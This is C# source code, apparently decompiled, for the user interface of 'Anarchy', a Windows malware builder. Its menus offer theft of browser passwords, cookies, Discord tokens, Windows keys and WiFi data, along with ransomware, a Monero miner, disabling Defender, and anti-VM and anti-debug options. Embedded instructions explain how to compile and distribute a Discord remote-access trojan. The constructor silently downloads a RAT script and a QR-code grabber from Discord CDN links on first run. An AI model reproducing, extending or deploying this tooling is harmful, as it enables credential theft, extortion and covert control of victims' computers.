using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Anarchy.Helpers;
using Anarchy.Properties;
using DiscordRPC;
using Guna.UI2.WinForms;
using Leaf.xNet;
using ScintillaNET;
using Siticone.UI.WinForms;
using FileInfo = Anarchy.Helpers.FileInfo;
using Settings = Anarchy.Properties.Settings;

namespace Anarchy.Forms;

public class GForm0 : Form
{
    private static string version = "0.7.2";

    public DiscordRpcClient dc_client;

    private static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

    private string aioDir = GForm0.appdata + "\\Temps";

    private string cButton = "red";

    private static bool ifExe1 = false;

    private static bool ifExe2 = false;

    private static bool ifExe3 = false;

    private static bool ifExe4 = false;

    private static bool ifExe5 = false;

    private static string exe1 = "";

    private static string exe2 = "";

    private static string exe3 = "";

    private static string exe4 = "";

    private static string exe5 = "";

    private bool moving;

    private readonly Random _random = new Random();

    private readonly RandomCharacters _randomChars;

    private readonly RandomCharacters randomCharacters_0;

    private readonly RandomInfo randomFileInfo_0;

    private int pageNow = 1;

    public const int WM_NCLBUTTONDOWN = 161;

    public const int HT_CAPTION = 2;

    private string Title = "N/A";

    private string Description = "N/A";

    private string Product = "N/A";

    private string Company = "N/A";

    private string Copyright = "N/A";

    private string Trademark = "N/A";

    private string MajorVersion = "N/A";

    private string MinorVersion = "N/A";

    private string BuildPart = "N/A";

    private string PrivatePart = "N/A";

    private string ynBtn = "yes";

    private string whcbe = "Webhook cannot be empty!";

    private string whvalid = "Webhook valid.";

    private string whinvalid = "Invalid webhook.";

    private string sthww = "Something went wrong.";

    private string yes = "Yes";

    private string no = "No";

    private string check = "Check";

    private string red = "Red";

    private string green = "Green";

    private string blue = "Blue";

    private string white = "White";

    private string lversion = "Version:";

    private string uicolor = "UI Color:";

    private string susername = "Show username:";

    private string cupdates = "Check-updates:";

    private string language = "Language:";

    private string settings = "Settings";

    private string lmain = "Main";

    private string additional = "Additional";

    private string inspector = "Inspector";

    private string misc = "Misc";

    private string upload = "Upload";

    private string licon = "Icon";

    private string build = "Save";

    private string clone = "Clone";

    private string generate = "Generate";

    private string fInfo = "Metadata:";

    private string none = "None";

    private string generateorclone = "You need to generate or clone metadata.";

    private string pumpinfo = "You need to provide size of the output file!";

    private string selectpumpsize = "You need to select the size of pump.";

    private string pumpedTo = "File pumped to ";

    private string whdeleted = "Webhook deleted.";

    private string whfstop = "Webhook flooder stopped.";

    private string whusmsempty = "Webhook, name and message cannot be empty!";

    private string toomany = "Too many requests.\nSpam delayed.";

    private string start = "Start";

    private string stop = "Stop";

    private string started = "Started";

    private string stopped = "Stopped";

    private string cpuusage = "Select CPU usage.";

    private string poolusrname = "Provide pool, username and password.";

    private string compdone = "Compilation done.";

    private string addcreated = "Additional options created. Compiling...";

    private string savedas = "Saved as ";

    private string creatingadds = "Creating additional options...";

    private string creatingfile = "Creating file...";

    private string openingexp = "Opening explorer...";

    private string tokencannotempt = "Token cannot be empty!";

    private string invalidtoken = "Invalid token.";

    private string tokendeleted = "Token deleted.";

    private string disabled = "Disabled";

    private string enabled = "Enabled";

    private string unverified = "Unverified";

    private string verified = "Verified";

    private string nopass = "No passwords!";

    private string nocookies = "No cookies!";

    private string nohistory = "No history!";

    private string novpn = "No VPN!";

    private string nowifinetwork = "No WiFi Network data!";

    private string nowifipass = "No WiFi passwords";

    private string filecreated = "File created. Please wait...";

    private string lminer = "Miner";

    private string exportas = "Export (as .txt)";

    private string credentials = "Credentials";

    private string dName = "Name:";

    private string dIP = "IP Address:";

    private string dMAC = "MAC Address:";

    private string dToken = "DC Token:";

    private string dWin = "WIN Key:";

    private string embedcolor = "Embed color";

    private string select = "Select";

    private string idle = "Idle...";

    private string delete = "Delete";

    private string pump = "Pump";

    private string filepumper = "File pumper";

    private string lusername = "Username";

    private string lmessage = "Message";

    private string floodercolor = "Flooder embed color";

    private string whflooder = "Webhook flooder";

    private string deletewh = "Delete webhook";

    private string deletetkn = "Delete token";

    private string safemode = "Safe mode";

    private string addsettings = "Additional settings";

    private string fakeerror = "Fake error";

    private string ltitle = "Title";

    private string customplugin = "Custom plugin";

    private string lobfuscate = "Obfuscate";

    private string rostart = "Run on startup";

    private string disabledefender = "Disable Windows Defender";

    private string disablemanager = "Disable Task Manager";

    private string lbsod = "Blue Screen";

    private string wbblocker = "Website blocker";

    private string lhide = "Hide stealer";

    private string ljumpscare = "Jumpscare";

    private string disableinput = "Disable mouse and keyboard";

    private string swindowskey = "Steal windows key";

    private string spasswords = "Steal browser passwords";

    private string scookies = "Steal browser cookies";

    private string svpnc = "Steal VPN";

    private string wifidata = "Steal WiFi data";

    private string disableinternet = "Disable internet";

    private string shistory = "Steal browser history";

    private string cminer = "Crypto miner";

    private string lransomware = "Ransomware";

    private string mpool = "Monero pool";

    private string lpassword = "Password";

    private string lusage = "CPU usage";

    private string minerInstruction = "1. Setup your pool (ex. pool.minergate.com:443)\n2. Setup your username. If you're using minergate fill in your email address.\n3. To setup workers' name change password variable.";

    private string lrequire = "Requirements installation";

    private string linstertt = "Insert token";

    private string linstall = "Install";

    private string pipinstall = "PIP installed";

    private string compile = "Compile";

    private string compilerat = "Compile RAT";

    private string linsert = "Insert";

    private string instruction2 = "1. Create discord bot, add it to your server (with administrator privileges).\n2. Install python3.\n3. Click install button.\n4. Insert discord bot token and press Insert button.\n5. Click compile rat button.\n6. Upload compiled rat to website/discord.\n7. Provide url of compiled rat into.\n8. Check Discord RAT in additional page.\n\nCommands are on our discord server.\nIf you cannot compile RAT, uninstall enum34 package with <py -m pip uninstall enum34>";

    private string saveB = "Save";

    private const int Keysize = 256;

    private const int DerivationIterations = 1000;

    private bool webhookSwitch;

    private bool webHandler;

    private Font smallOne = new Font("Poppins", 7f, FontStyle.Regular);

    private Font biggerOne = new Font("Poppins Medium", 7f, FontStyle.Bold);

    private IContainer components;

    private Panel sidePanel;

    private Panel pnlNav;

    private System.Windows.Forms.Button btnInventory;

    private System.Windows.Forms.Button btnSettings;

    private System.Windows.Forms.Button btnParty;

    private System.Windows.Forms.Button btnMap;

    private System.Windows.Forms.Button btnWork;

    private System.Windows.Forms.Button btnDashboard;

    private Panel panel2;

    private Label usernameLabel;

    private Panel settingsSite;

    private Label label1;

    private Label label2;

    private Label label3;

    private Label versionLabel;

    private Label label5;

    private System.Windows.Forms.Button redButton;

    private System.Windows.Forms.Button button1;

    private System.Windows.Forms.Button button2;

    private System.Windows.Forms.Button shNo;

    private System.Windows.Forms.Button shYes;

    private System.Windows.Forms.Button btnUpdates;

    private System.Windows.Forms.Button button3;

    private Panel mainSite;

    private Label label4;

    private PictureBox iconBox;

    private Label label6;

    private System.Windows.Forms.Button iconUpload;

    private System.Windows.Forms.Button englishButton;

    private Label label7;

    private System.Windows.Forms.Button polishButton;

    private System.Windows.Forms.Button frenchButton;

    private System.Windows.Forms.Button russianButton;

    private System.Windows.Forms.Button turkishButton;

    private System.Windows.Forms.Button spanishButton;

    private System.Windows.Forms.Button cloneButton;

    private System.Windows.Forms.Button generateButton;

    private Label fileinfoLabel;

    private Label label8;

    private PictureBox embedBox;

    private System.Windows.Forms.Button colorSelect;

    private Label label9;

    private Panel inspectorSite;

    private System.Windows.Forms.Button dAIOupload;

    private Label label14;

    private TextBox dAIObox;

    private TextBox nameBox;

    private Label label15;

    private Label label13;

    private Label label12;

    private Label label11;

    private Label label10;

    private TextBox winBox;

    private TextBox tokenBox;

    private TextBox macBox;

    private TextBox ipBox;

    private Label label16;

    private System.Windows.Forms.Button exportCredentials;

    private Panel additionalSite;

    private CheckBox blockerBox;

    private CheckBox pluginBox;

    private CheckBox bsodBox;

    private CheckBox taskmanagerBox;

    private CheckBox defenderBox;

    private CheckBox startupBox;

    private CheckBox errorBox;

    private CheckBox obfuscateBox;

    private Label label17;

    private CheckBox inputdBox;

    private CheckBox jumpscareBox;

    private CheckBox cryptoBox;

    private CheckBox ransomBox;

    private TextBox fakeMessageBox;

    private TextBox faketitleBox;

    private Label label19;

    private Label label18;

    private Label label21;

    private Label label20;

    private Scintilla pluginSource;

    private TextBox pumpBox;

    private Label label28;

    private System.Windows.Forms.Button pumpButton;

    private Panel miscSite;

    private CheckBox gbBox;

    private CheckBox mbBox;

    private CheckBox kbBox;

    private TextBox pumpPathBox;

    private System.Windows.Forms.Button button4;

    private Label label22;

    private TextBox miscWebhookBox;

    private System.Windows.Forms.Button wdeleteButton;

    private Label label25;

    private Label label24;

    private TextBox textBox2;

    private Label label23;

    private TextBox userBox;

    private CheckBox safeBox;

    private Label label26;

    private PictureBox flooderEmbed;

    private System.Windows.Forms.Button flooderEmSelect;

    private Label label27;

    private Label tVLabel;

    private Label tMFALabel;

    private Label tIDLabel;

    private Label tPhoneLabel;

    private Label tEmailLabel;

    private Label tNameLabel;

    private PictureBox avatarBox;

    private System.Windows.Forms.Button button8;

    private Label label36;

    private Label label35;

    private Label label34;

    private Label label33;

    private Label label32;

    private Label label31;

    private Label label30;

    private System.Windows.Forms.Button tokenChecker;

    private Label label29;

    private TextBox TokenCheckerBox;

    private CheckBox dinternetBox;

    private Panel minerSite;

    private Label label37;

    private Label label52;

    private Label label53;

    private TextBox textBox1;

    private Label label54;

    private TextBox textBox3;

    private CheckBox checkBox2;

    private CheckBox checkBox3;

    private CheckBox checkBox4;

    private Label label57;

    private TextBox textBox6;

    private Label label38;

    private Label translateLabel;

    private Label checkingLabel;

    private CheckBox ratBox;

    private System.Windows.Forms.Button ratButton;

    private Panel ratSite;

    private System.Windows.Forms.Button ratInstallButton;

    private Label label44;

    private TextBox rURLBox;

    private Label label40;

    private Label label42;

    private TextBox ratTokenBox;

    private CheckBox pipBox;

    private System.Windows.Forms.Button insertButton;

    private Label label43;

    private System.Windows.Forms.Button ratCompileButton;

    private Label label45;

    private System.Windows.Forms.Button saveButton;

    private Label page2;

    private Label page1;

    private System.Windows.Forms.Button qrButton;

    private Panel qrSite;

    private System.Windows.Forms.Button qrStartBtn;

    private Label label46;

    private System.Windows.Forms.Button button7;

    private Label label50;

    private Label label51;

    private Label label47;

    private System.Windows.Forms.Button fixButton;

    private System.Windows.Forms.Button binderButton;

    private Label label41;

    private Panel binderSite;

    private Label label56;

    private System.Windows.Forms.Button button11;

    private System.Windows.Forms.Button button10;

    private System.Windows.Forms.Button button9;

    private Label label55;

    private System.Windows.Forms.Button button13;

    private System.Windows.Forms.Button button12;

    private Label label59;

    private Label label58;

    private Label label49;

    private Label label48;

    private Label label63;

    private Label label62;

    private Label label61;

    private Label label60;

    private Label label64;

    private System.Windows.Forms.Button germanButton;

    private System.Windows.Forms.Button arabicButton;

    private System.Windows.Forms.Button fakesButton;

    private Panel fakesSite;

    private Label label69;

    private System.Windows.Forms.Button backButton;

    private CheckBox desBox;

    private CheckBox wizardBox;

    private CheckBox nitroBox;

    private CheckBox cmdBox;

    private CheckBox emuBox;

    private CheckBox sandboxBox;

    private CheckBox vmBox;

    private CheckBox debugBox;

    private CheckBox sniffersBox;

    private CheckBox mercurialBox;

    private Guna2TabControl guna2TabControl1;

    private TabPage tabPage3;

    private Label label144;

    private SiticoneOSToggleSwith hidesBox;

    private Label label143;

    private SiticoneOSToggleSwith sVpnBox;

    private Label label123;

    private SiticoneOSToggleSwith swifiBox;

    private Label label122;

    private SiticoneOSToggleSwith swinkeyBox;

    private Label asd;

    private SiticoneOSToggleSwith sbrhisBox;

    private Label label39;

    private SiticoneOSToggleSwith sbrCookiesBox;

    private Label label65;

    private SiticoneOSToggleSwith sbrpassBox;

    private TabPage tabPage2;

    private Guna2Button webhookCheck;

    private Guna2HtmlLabel guna2HtmlLabel1;

    private Guna2Button buildButton;

    public Guna2TextBox webhookBox;

    private Label buildingLabel;

    private Guna2Panel guna2Panel2;

    internal Label label67;

    private SiticoneControlBox siticoneControlBox4;

    private SiticoneControlBox siticoneControlBox3;

    private Guna2BorderlessForm guna2BorderlessForm1;

    private Guna2DragControl guna2DragControl1;

    private Guna2Button button5;

    private Guna2Button button6;

    [DllImport("Gdi32.dll")]
    private static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);

    public GForm0()
    {
        this.InitializeComponent();
        base.Region = Region.FromHrgn(GForm0.CreateRoundRectRgn(0, 0, base.Width, base.Height, 25, 25));
        this.pnlNav.Height = this.btnDashboard.Height;
        this.pnlNav.Top = this.btnDashboard.Top;
        this.pnlNav.Left = this.btnDashboard.Left;
        this.btnDashboard.BackColor = Color.FromArgb(11, 11, 11);
        this.mainSite.Show();
        this.settingsSite.Hide();
        this.inspectorSite.Hide();
        this.additionalSite.Hide();
        this.miscSite.Hide();
        this.minerSite.Hide();
        this.ratSite.Hide();
        this.qrSite.Hide();
        this.binderSite.Hide();
        this.qrButton.Hide();
        this.binderButton.Hide();
        this.fakesSite.Hide();
        this.usernameLabel.Text = Environment.UserName;
        this.versionLabel.Text = GForm0.version;
        switch (Settings.Default["ui_Color"].ToString())
        {
            case "red":
                this.redButton_Click(new object(), new EventArgs());
                break;
            case "green":
                this.button1_Click(new object(), new EventArgs());
                break;
            case "blue":
                this.button2_Click(new object(), new EventArgs());
                break;
            case "white":
                this.button3_Click(new object(), new EventArgs());
                break;
        }
        if (Settings.Default["show_Username"].ToString() == "yes")
        {
            this.shYes_Click(new object(), new EventArgs());
        }
        else
        {
            this.shNo_Click(new object(), new EventArgs());
        }
        this.refreshLanguage();
        this.Scintilla();
        this._randomChars = new RandomCharacters();
        this.randomFileInfo_0 = new RandomInfo(this.randomCharacters_0);
        if (!Directory.Exists(this.aioDir))
        {
            Directory.CreateDirectory(this.aioDir);
            Directory.CreateDirectory(this.aioDir + "\\QRGrabber");
            try
            {
                new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973554721795235940/973555367231508500/requirements.txt", this.aioDir + "\\requirements.txt");
                new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973554721795235940/973557709578334288/DiscordRAT.py", this.aioDir + "\\DiscordRAT.py");
                new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973554721795235940/973557313912864788/QRG.zip", this.aioDir + "\\QRG.zip");
                ZipFile.ExtractToDirectory(this.aioDir + "\\QRG.zip", this.aioDir + "\\QRGrabber");
                File.Delete(this.aioDir + "\\QRG.zip");
            }
            catch
            {
            }
        }
        this.DiscordRPC();
    }

    private void dAIOmain_Load(object sender, EventArgs e)
    {
    }

    protected void DiscordRPC()
    {
        this.dc_client = new DiscordRpcClient("811586717433331732");
        this.dc_client.Initialize();
        this.dc_client.SetPresence(new RichPresence
        {
            Assets = new Assets()
        });
    }

    private void Scintilla()
    {
        this.pluginSource.Lexer = Lexer.Cpp;
        this.pluginSource.StyleResetDefault();
        this.pluginSource.Styles[32].Font = "Consolas";
        this.pluginSource.Styles[32].Size = 10;
        this.pluginSource.Styles[32].BackColor = Color.FromArgb(5, 5, 5);
        this.pluginSource.Styles[32].ForeColor = Color.DarkRed;
        this.pluginSource.StyleClearAll();
        this.pluginSource.Styles[0].ForeColor = Color.DarkRed;
        this.pluginSource.Styles[1].ForeColor = Color.FromArgb(0, 128, 0);
        this.pluginSource.Styles[2].ForeColor = Color.FromArgb(0, 128, 0);
        this.pluginSource.Styles[15].ForeColor = Color.FromArgb(128, 128, 128);
        this.pluginSource.Styles[4].ForeColor = Color.Olive;
        this.pluginSource.Styles[5].ForeColor = Color.Blue;
        this.pluginSource.Styles[16].ForeColor = Color.Blue;
        this.pluginSource.Styles[6].ForeColor = Color.FromArgb(163, 21, 21);
        this.pluginSource.Styles[7].ForeColor = Color.FromArgb(163, 21, 21);
        this.pluginSource.Styles[13].ForeColor = Color.FromArgb(163, 21, 21);
        this.pluginSource.Styles[12].BackColor = Color.Pink;
        this.pluginSource.Styles[10].ForeColor = Color.Purple;
        this.pluginSource.Styles[9].ForeColor = Color.Maroon;
        this.pluginSource.Margins[0].Width = 16;
        this.pluginSource.Styles[33].BackColor = Color.FromArgb(16, 16, 16);
        this.pluginSource.ScrollWidth = 1;
    }

    [DllImport("user32.dll")]
    public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

    [DllImport("user32.dll")]
    public static extern bool ReleaseCapture();

    private void Form1_MouseDown(object sender, MouseEventArgs e)
    {
        if (e.Button == MouseButtons.Left)
        {
            GForm0.ReleaseCapture();
            GForm0.SendMessage(base.Handle, 161, 2, 0);
        }
    }

    private void btnExit_Click(object sender, EventArgs e)
    {
        Environment.Exit(0);
    }

    private void btnDashboard_Click(object sender, EventArgs e)
    {
        this.pnlNav.Height = this.btnDashboard.Height;
        this.pnlNav.Top = this.btnDashboard.Top;
        this.pnlNav.Left = this.btnDashboard.Left;
        this.btnDashboard.BackColor = Color.FromArgb(11, 11, 11);
        this.mainSite.Show();
        this.settingsSite.Hide();
        this.inspectorSite.Hide();
        this.additionalSite.Hide();
        this.miscSite.Hide();
        this.minerSite.Hide();
        this.ratSite.Hide();
        this.qrSite.Hide();
        this.binderSite.Hide();
        this.fakesSite.Hide();
    }

    private void btnInventory_Click(object sender, EventArgs e)
    {
        this.pnlNav.Height = this.btnInventory.Height;
        this.pnlNav.Top = this.btnInventory.Top;
        this.pnlNav.Left = this.btnInventory.Left;
        this.btnInventory.BackColor = Color.FromArgb(11, 11, 11);
        this.btnDashboard.BackColor = Color.FromArgb(8, 8, 8);
        this.mainSite.Hide();
        this.settingsSite.Hide();
        this.inspectorSite.Hide();
        this.additionalSite.Show();
        this.miscSite.Hide();
        this.minerSite.Hide();
        this.ratSite.Hide();
        this.qrSite.Hide();
        this.fakesSite.Hide();
        this.binderSite.Hide();
    }

    private void btnWork_Click(object sender, EventArgs e)
    {
        this.pnlNav.Height = this.btnWork.Height;
        this.pnlNav.Top = this.btnWork.Top;
        this.pnlNav.Left = this.btnWork.Left;
        this.btnWork.BackColor = Color.FromArgb(11, 11, 11);
        this.btnDashboard.BackColor = Color.FromArgb(8, 8, 8);
        this.settingsSite.Hide();
        this.inspectorSite.Show();
        this.additionalSite.Hide();
        this.mainSite.Hide();
        this.miscSite.Hide();
        this.minerSite.Hide();
        this.ratSite.Hide();
        this.qrSite.Hide();
        this.fakesSite.Hide();
        this.binderSite.Hide();
    }

    private void btnMap_Click(object sender, EventArgs e)
    {
        this.pnlNav.Height = this.btnMap.Height;
        this.pnlNav.Top = this.btnMap.Top;
        this.pnlNav.Left = this.btnMap.Left;
        this.btnMap.BackColor = Color.FromArgb(11, 11, 11);
        this.btnDashboard.BackColor = Color.FromArgb(8, 8, 8);
        this.mainSite.Hide();
        this.settingsSite.Hide();
        this.additionalSite.Hide();
        this.inspectorSite.Hide();
        this.miscSite.Show();
        this.minerSite.Hide();
        this.ratSite.Hide();
        this.qrSite.Hide();
        this.binderSite.Hide();
        this.fakesSite.Hide();
    }

    private void btnParty_Click(object sender, EventArgs e)
    {
        this.pnlNav.Height = this.btnParty.Height;
        this.pnlNav.Top = this.btnParty.Top;
        this.pnlNav.Left = this.btnParty.Left;
        this.btnParty.BackColor = Color.FromArgb(11, 11, 11);
        this.btnDashboard.BackColor = Color.FromArgb(8, 8, 8);
        this.mainSite.Hide();
        this.settingsSite.Hide();
        this.additionalSite.Hide();
        this.inspectorSite.Hide();
        this.miscSite.Hide();
        this.minerSite.Show();
        this.ratSite.Hide();
        this.qrSite.Hide();
        this.fakesSite.Hide();
        this.binderSite.Hide();
    }

    private void ratButton_Click(object sender, EventArgs e)
    {
        this.pnlNav.Height = this.ratButton.Height;
        this.pnlNav.Top = this.ratButton.Top;
        this.pnlNav.Left = this.ratButton.Left;
        this.ratButton.BackColor = Color.FromArgb(11, 11, 11);
        this.btnDashboard.BackColor = Color.FromArgb(8, 8, 8);
        this.mainSite.Hide();
        this.settingsSite.Hide();
        this.additionalSite.Hide();
        this.inspectorSite.Hide();
        this.miscSite.Hide();
        this.minerSite.Hide();
        this.ratSite.Show();
        this.qrSite.Hide();
        this.fakesSite.Hide();
        this.binderSite.Hide();
    }

    private void btnSettings_Click(object sender, EventArgs e)
    {
        this.pnlNav.Height = this.btnSettings.Height;
        this.pnlNav.Top = this.btnSettings.Top;
        this.pnlNav.Left = this.btnSettings.Left;
        this.btnSettings.BackColor = Color.FromArgb(11, 11, 11);
        this.btnDashboard.BackColor = Color.FromArgb(8, 8, 8);
        this.qrButton.BackColor = Color.FromArgb(8, 8, 8);
        this.mainSite.Hide();
        this.settingsSite.Show();
        this.miscSite.Hide();
        this.additionalSite.Hide();
        this.inspectorSite.Hide();
        this.minerSite.Hide();
        this.ratSite.Hide();
        this.qrSite.Hide();
        this.fakesSite.Hide();
        this.binderSite.Hide();
    }

    private void ratButton_Leave(object sender, EventArgs e)
    {
        this.ratButton.BackColor = Color.FromArgb(8, 8, 8);
    }

    private void btnDashboard_Leave(object sender, EventArgs e)
    {
        this.btnDashboard.BackColor = Color.FromArgb(8, 8, 8);
    }

    private void btnInventory_Leave(object sender, EventArgs e)
    {
        this.btnInventory.BackColor = Color.FromArgb(8, 8, 8);
    }

    private void btnWork_Leave(object sender, EventArgs e)
    {
        this.btnWork.BackColor = Color.FromArgb(8, 8, 8);
    }

    private void btnMap_Leave(object sender, EventArgs e)
    {
        this.btnMap.BackColor = Color.FromArgb(8, 8, 8);
    }

    private void btnParty_Leave(object sender, EventArgs e)
    {
        this.btnParty.BackColor = Color.FromArgb(8, 8, 8);
    }

    private void btnSettings_Leave(object sender, EventArgs e)
    {
        this.btnSettings.BackColor = Color.FromArgb(8, 8, 8);
    }

    private void pictureBox1_Click(object sender, EventArgs e)
    {
        Process.Start("https://discord.gg/C8zauKSBR2");
    }

    private void redButton_Click(object sender, EventArgs e)
    {
        this.button1.FlatAppearance.BorderSize = 0;
        this.button2.FlatAppearance.BorderSize = 0;
        this.redButton.FlatAppearance.BorderSize = 1;
        this.button3.FlatAppearance.BorderSize = 0;
        this.cButton = "red";
        if (this.translateLabel.Text != "null")
        {
            this.translateLabel.ForeColor = Color.DarkRed;
        }
        if (this.checkingLabel.Text != "null")
        {
            this.checkingLabel.ForeColor = Color.DarkRed;
        }
        this.usernameLabel.ForeColor = Color.DarkRed;
        this.versionLabel.ForeColor = Color.DarkRed;
        this.pnlNav.BackColor = Color.DarkRed;
        this.btnDashboard.ForeColor = Color.DarkRed;
        this.btnInventory.ForeColor = Color.DarkRed;
        this.btnWork.ForeColor = Color.DarkRed;
        this.btnMap.ForeColor = Color.DarkRed;
        this.btnParty.ForeColor = Color.DarkRed;
        this.btnSettings.ForeColor = Color.DarkRed;
        this.label1.ForeColor = Color.DarkRed;
        this.label2.ForeColor = Color.DarkRed;
        this.label3.ForeColor = Color.DarkRed;
        this.label4.ForeColor = Color.DarkRed;
        this.label5.ForeColor = Color.DarkRed;
        this.label6.ForeColor = Color.DarkRed;
        this.label7.ForeColor = Color.DarkRed;
        this.shYes.ForeColor = Color.DarkRed;
        this.shNo.ForeColor = Color.DarkRed;
        this.btnUpdates.ForeColor = Color.DarkRed;
        this.englishButton.ForeColor = Color.DarkRed;
        this.russianButton.ForeColor = Color.DarkRed;
        this.frenchButton.ForeColor = Color.DarkRed;
        this.polishButton.ForeColor = Color.DarkRed;
        this.turkishButton.ForeColor = Color.DarkRed;
        this.spanishButton.ForeColor = Color.DarkRed;
        this.label57.ForeColor = Color.DarkRed;
        this.label54.ForeColor = Color.DarkRed;
        this.label53.ForeColor = Color.DarkRed;
        this.label37.ForeColor = Color.DarkRed;
        this.label52.ForeColor = Color.DarkRed;
        this.textBox6.ForeColor = Color.DarkRed;
        this.textBox1.ForeColor = Color.DarkRed;
        this.textBox3.ForeColor = Color.DarkRed;
        this.checkBox2.ForeColor = Color.DarkRed;
        this.checkBox3.ForeColor = Color.DarkRed;
        this.checkBox4.ForeColor = Color.DarkRed;
        this.label17.ForeColor = Color.DarkRed;
        this.label18.ForeColor = Color.DarkRed;
        this.label19.ForeColor = Color.DarkRed;
        this.label20.ForeColor = Color.DarkRed;
        this.label21.ForeColor = Color.DarkRed;
        this.faketitleBox.ForeColor = Color.DarkRed;
        this.fakeMessageBox.ForeColor = Color.DarkRed;
        this.obfuscateBox.ForeColor = Color.DarkRed;
        this.errorBox.ForeColor = Color.DarkRed;
        this.startupBox.ForeColor = Color.DarkRed;
        this.defenderBox.ForeColor = Color.DarkRed;
        this.taskmanagerBox.ForeColor = Color.DarkRed;
        this.bsodBox.ForeColor = Color.DarkRed;
        this.pluginBox.ForeColor = Color.DarkRed;
        this.blockerBox.ForeColor = Color.DarkRed;
        this.hidesBox.ForeColor = Color.DarkRed;
        this.jumpscareBox.ForeColor = Color.DarkRed;
        this.inputdBox.ForeColor = Color.DarkRed;
        this.swinkeyBox.ForeColor = Color.DarkRed;
        this.sbrpassBox.ForeColor = Color.DarkRed;
        this.sbrCookiesBox.ForeColor = Color.DarkRed;
        this.sVpnBox.ForeColor = Color.DarkRed;
        this.swifiBox.ForeColor = Color.DarkRed;
        this.sbrhisBox.ForeColor = Color.DarkRed;
        this.dinternetBox.ForeColor = Color.DarkRed;
        this.pluginSource.Lexer = Lexer.Cpp;
        this.pluginSource.StyleResetDefault();
        this.pluginSource.Styles[32].Font = "Consolas";
        this.pluginSource.Styles[32].Size = 10;
        this.pluginSource.Styles[32].BackColor = Color.FromArgb(5, 5, 5);
        this.pluginSource.Styles[32].ForeColor = Color.DarkRed;
        this.pluginSource.StyleClearAll();
        this.pluginSource.Styles[0].ForeColor = Color.DarkRed;
        this.pluginSource.Styles[1].ForeColor = Color.FromArgb(0, 128, 0);
        this.pluginSource.Styles[2].ForeColor = Color.FromArgb(0, 128, 0);
        this.pluginSource.Styles[15].ForeColor = Color.FromArgb(128, 128, 128);
        this.pluginSource.Styles[4].ForeColor = Color.Olive;
        this.pluginSource.Styles[5].ForeColor = Color.Blue;
        this.pluginSource.Styles[16].ForeColor = Color.Blue;
        this.pluginSource.Styles[6].ForeColor = Color.FromArgb(163, 21, 21);
        this.pluginSource.Styles[7].ForeColor = Color.FromArgb(163, 21, 21);
        this.pluginSource.Styles[13].ForeColor = Color.FromArgb(163, 21, 21);
        this.pluginSource.Styles[12].BackColor = Color.Pink;
        this.pluginSource.Styles[10].ForeColor = Color.Purple;
        this.pluginSource.Styles[9].ForeColor = Color.Maroon;
        this.pluginSource.Margins[0].Width = 16;
        this.pluginSource.Styles[33].BackColor = Color.FromArgb(16, 16, 16);
        this.pluginSource.ScrollWidth = 1;
        this.label9.ForeColor = Color.DarkRed;
        this.label8.ForeColor = Color.DarkRed;
        this.fileinfoLabel.ForeColor = Color.DarkRed;
        this.buildingLabel.ForeColor = Color.DarkRed;
        this.embedBox.BackColor = Color.DarkRed;
        this.iconUpload.ForeColor = Color.DarkRed;
        this.iconUpload.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.iconUpload.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.colorSelect.ForeColor = Color.DarkRed;
        this.colorSelect.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.colorSelect.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.generateButton.ForeColor = Color.DarkRed;
        this.generateButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.generateButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.cloneButton.ForeColor = Color.DarkRed;
        this.cloneButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.cloneButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.label14.ForeColor = Color.DarkRed;
        this.label10.ForeColor = Color.DarkRed;
        this.label11.ForeColor = Color.DarkRed;
        this.label12.ForeColor = Color.DarkRed;
        this.label13.ForeColor = Color.DarkRed;
        this.label15.ForeColor = Color.DarkRed;
        this.label16.ForeColor = Color.DarkRed;
        this.dAIObox.ForeColor = Color.DarkRed;
        this.nameBox.ForeColor = Color.DarkRed;
        this.ipBox.ForeColor = Color.DarkRed;
        this.macBox.ForeColor = Color.DarkRed;
        this.tokenBox.ForeColor = Color.DarkRed;
        this.winBox.ForeColor = Color.DarkRed;
        this.exportCredentials.ForeColor = Color.DarkRed;
        this.exportCredentials.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.exportCredentials.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.dAIOupload.ForeColor = Color.DarkRed;
        this.dAIOupload.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.dAIOupload.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.label28.ForeColor = Color.DarkRed;
        this.pumpBox.ForeColor = Color.DarkRed;
        this.pumpPathBox.ForeColor = Color.DarkRed;
        this.label22.ForeColor = Color.DarkRed;
        this.label29.ForeColor = Color.DarkRed;
        this.TokenCheckerBox.ForeColor = Color.DarkRed;
        this.label23.ForeColor = Color.DarkRed;
        this.label24.ForeColor = Color.DarkRed;
        this.userBox.ForeColor = Color.DarkRed;
        this.textBox2.ForeColor = Color.DarkRed;
        this.label27.ForeColor = Color.DarkRed;
        this.flooderEmbed.BackColor = Color.DarkRed;
        this.safeBox.ForeColor = Color.DarkRed;
        this.label26.ForeColor = Color.DarkRed;
        this.label25.ForeColor = Color.DarkRed;
        this.label36.ForeColor = Color.DarkRed;
        this.label30.ForeColor = Color.DarkRed;
        this.label31.ForeColor = Color.DarkRed;
        this.label32.ForeColor = Color.DarkRed;
        this.label33.ForeColor = Color.DarkRed;
